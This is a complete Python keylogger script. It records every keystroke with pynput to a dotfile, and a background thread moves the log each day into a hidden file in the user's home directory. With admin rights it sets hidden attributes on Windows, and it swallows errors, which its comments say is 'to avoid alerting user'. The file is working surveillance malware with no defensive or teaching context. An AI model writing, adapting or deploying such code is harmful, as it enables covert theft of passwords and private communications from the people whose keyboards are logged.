import os
import sys
import time
import threading
import shutil
from datetime import datetime
from pynput import keyboard
from pathlib import Path

# Define file paths
temp_file_name = ".temp_keylog.txt"
home_dir = Path.home()
static_log_file_name = ".final_keylog.txt"
last_transfer_file = ".last_transfer.txt"
temp_file_path = Path(temp_file_name)  # In the current directory
static_log_file_path = home_dir / static_log_file_name
last_transfer_file_path = Path(last_transfer_file)

# Check if running with admin rights (Windows) or root (Linux)
def is_admin():
    if os.name == 'nt':  # Windows
        import ctypes
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:  # Linux or Unix-like systems
        return os.geteuid() == 0

# Limited mode flag
limited_mode = not is_admin()

# Ensure hidden files on Windows (skip this if no admin rights)
def hide_file(file_path):
    if not limited_mode and os.name == 'nt':  # Windows OS and admin rights
        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(str(file_path), 0x02)
        except Exception as e:
            pass  # Ignore errors in limited mode

# Log keystrokes to temp file
def log_key(key):
    try:
        with open(temp_file_path, "a") as temp_file:
            temp_file.write(str(key) + "\n")
    except Exception as e:
        pass  # Fail silently to avoid alerting user

# Get last log transfer time
def get_last_transfer_time():
    if last_transfer_file_path.exists():
        try:
            with open(last_transfer_file_path, "r") as file:
                last_transfer_str = file.read().strip()
                return datetime.strptime(last_transfer_str, "%Y-%m-%d %H:%M:%S")
        except Exception as e:
            pass
    return None

# Update last log transfer time
def update_last_transfer_time():
    try:
        with open(last_transfer_file_path, "w") as file:
            file.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        if not limited_mode:
            hide_file(last_transfer_file_path)  # Hide the transfer log file as well if we have admin rights
    except Exception as e:
        pass

# Check if it's time to move logs
def is_time_to_move_logs():
    last_transfer_time = get_last_transfer_time()
    now = datetime.now()

    # If logs were never transferred or it's a new day and past 7 AM
    if not last_transfer_time or (now.date() > last_transfer_time.date() and now.hour >= 7):
        return True
    return False

# Move logs from temp file to final log file
def move_logs():
    while True:
        if is_time_to_move_logs():
            try:
                # Copy temp file content to final log file
                if temp_file_path.exists():
                    with open(temp_file_path, "r") as temp_file, open(static_log_file_path, "a") as final_file:
                        shutil.copyfileobj(temp_file, final_file)
                    
                    # Delete the temporary file after copying
                    os.remove(temp_file_path)

                    # Ensure the final log file is hidden if we have admin rights
                    if not limited_mode:
                        hide_file(static_log_file_path)

                    # Update the last transfer time
                    update_last_transfer_time()

            except Exception as e:
                pass  # Fail silently
        time.sleep(60)  # Sleep for 1 minute before rechecking

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

# Start the daily log mover in a separate thread
log_mover_thread = threading.Thread(target=move_logs)
log_mover_thread.daemon = True
log_mover_thread.start()

# Start keylogger
start_keylogger()
